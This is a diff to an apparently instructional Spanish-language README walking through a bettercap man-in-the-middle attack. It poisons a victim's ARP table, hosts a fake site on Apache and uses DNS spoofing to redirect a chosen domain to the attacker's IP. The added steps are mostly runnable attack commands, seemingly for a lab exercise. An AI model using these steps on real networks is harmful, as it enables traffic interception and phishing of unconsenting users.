@@ -85,3 +85,50 @@ arp.spoof on
 ```bash
 set net.sniff.verbose false
 ```
+Esto que hemos realizado es para el router, ahora lo haríamos con la máquina victima
+
+### 8. Repetir paso 5 pero con la IP de la victima
+```bash
+set arp.spoof targets <IP>
+```
+
+### 9. Iniciar arp spoofng 
+```bash
+arp.spoof on
+```
+
+### 10. Comprobar que el ataque ha funcionado realizando el comando en la victima
+```bash
+arp -a
+```
+Deberíamos de ver que, tanto la puerta de enlace como la IP de la máquina Kali, coinciden
+
+### 11. Configurar servidor apache
+```bash
+apt install apache2
+```
+Usaremos apache para almacenar la web que se alojará en el dominio e IP falsa que proporcionaremos a la víctima
+
+### 12. Asignar valor de dominio a dns spoof
+```bash
+set dns.spoof.domains <nombreDominio>
+```
+
+### 13. Redirigir a la victima a nuestra IP atacante
+```bash
+set dns.spoof.address <IPatacante>
+```
+### 14. Activar el servicio
+```bash
+dns.spoof on
+```
+---- 
+
+Para adjuntar video arrastrar archivo .mp4 al readme
+
+ https://github.com/user-attachments/assets/04ebb71f-a603-4e30-9f40-f156ebceabf3
+
+
+
+
+
